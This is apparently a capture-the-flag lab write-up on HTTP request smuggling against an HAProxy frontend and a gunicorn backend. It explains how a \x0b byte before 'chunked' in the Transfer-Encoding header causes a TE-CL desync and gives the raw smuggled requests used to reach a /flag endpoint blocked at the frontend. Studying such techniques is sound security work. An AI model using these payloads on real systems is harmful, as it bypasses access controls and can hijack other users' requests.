Now time to exploit haproxy!!!

Credits first:
https://github.com/p4k03n4t0r/http-request-smuggling?tab=readme-ov-file
https://ctftime.org/writeup/20655
https://nathandavison.com/blog/haproxy-http-request-smuggling
https://blog.deteact.com/gunicorn-http-request-smuggling/

HAProxy has a vulnerability that causes the parser to ignore the TE (Transfer-Encoding) header when encountering the `\x0b` character.

First of all let's see normal behaviour:

![](../Images/5-%20Lab%20Solution%202/req_1.png)

![](../Images/5-%20Lab%20Solution%202/default_haproxy.png)

It stripped out CL header and kept TE header.
This nice behaviour! But what happens if we inject \x0b there?
(https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MGI&oeol=VT copy & paste)

![](../Images/5-%20Lab%20Solution%202/req_2.png)

![](../Images/5-%20Lab%20Solution%202/wireshark_1.png)

It didn't strip out TE!
How will gunicorn behave?

```
if value.lower() == "chunked":
```

That shouldn't work right? It should skip chunked and use CL header instead.

![](../Images/5-%20Lab%20Solution%202/processed_0.png)

But there is also another process applied to value, before compared to "chunked".

![](../Images/5-%20Lab%20Solution%202/processed_1.png)

So in the end:

![](../Images/5-%20Lab%20Solution%202/processed_2.png)

Meaning:
gunicorn accepts that:
```
Transfer-Encoding: \x0bchunked
```
as valid header and process request as chunked. (\x0b is non printable char)

So:
- haproxy ignored TE header, used CL
- gunicorn used TE header, ignored CL

We need to exploit TE-CL.

Frontend have to send entire request to backend, backend will check TE header.

![](../Images/5-%20Lab%20Solution%202/req_3.png)

We can use update CL header option, as we want frontend to send everything to backend.

![](../Images/5-%20Lab%20Solution%202/wireshark_2.png)

Nope?
Server should have sent 2 responses?

Let's make it more obvious, I changed GET / to GET /404

![](../Images/5-%20Lab%20Solution%202/wireshark_3.png)

We didn't get extra response?

But in the theory server sees:

```
GET /404 HTTP/1.1
Host: we_do_not_need_host
Content-Length: 54
Transfer-Encoding: \x0bchunked\r\n
0\r\n\r\n
```

```
GET /flag HTTP/1.1\r\n
Host: we_do_not_need_host\r\n\r\n
```

It should have sent 2 responses back to us.

Maybe it stuck in backend some reason?
We can confirm if it is really there by sending one more request:

First:

![](../Images/5-%20Lab%20Solution%202/req_4.png)

Second:

![](../Images/5-%20Lab%20Solution%202/req_5.png)

Send them:

![](../Images/5-%20Lab%20Solution%202/req_6.png)

That worked!

![](../Images/5-%20Lab%20Solution%202/wireshark_4.png)

Server returned all responses now?

Server sees:

```
GET /404 HTTP/1.1
Host: we_do_not_need_host
Content-Length: 54
Transfer-Encoding: chunked\r\n
0\r\n\r\n
```

```
GET /flag HTTP/1.1\r\n
Host: we_do_not_need_host\r\n\r\n
```

```
ERROR / HTTP/1.1\r\n
Host: we_do_not_need_host\r\n\r\n
```

(I chose last request as ERROR so it is easier to identify in wireshark)

Somewhy it returns response after we send another request after the first one, otherwise it doesn't return everything like what we saw in mitmproxy.

Let's do it for last time.

First:

![](../Images/5-%20Lab%20Solution%202/req_7.png)

Second:

![](../Images/5-%20Lab%20Solution%202/req_8.png)

We need to make sure second is a valid request.

You could have sent something like that too
```
something\r\n\r\n
```
But it wouldn't work because of frontend server (it can't parse something is not a valid http request and forward to backend right?)

![](../Images/5-%20Lab%20Solution%202/req_9.png)

![](../Images/5-%20Lab%20Solution%202/wireshark_5.png)

![](../Images/5-%20Lab%20Solution%202/wireshark_6.png)

What server see:
Request 1:
```
GET /404 HTTP/1.1\r\n
Host: we_do_not_need_host\r\n
Content-Length: 60\r\n
Transfer-Encoding: chunked\r\n
0\r\n\r\n
```
Request 2:
```
GET /flag HTTP/1.1\r\n
Host: we_do_not_need_host\r\n
Foo: barGET / HTTP/1.1\r\n\r\n
```
Server sends back 2 responses. (/flag endpoint blocked on frontend server not on backend)
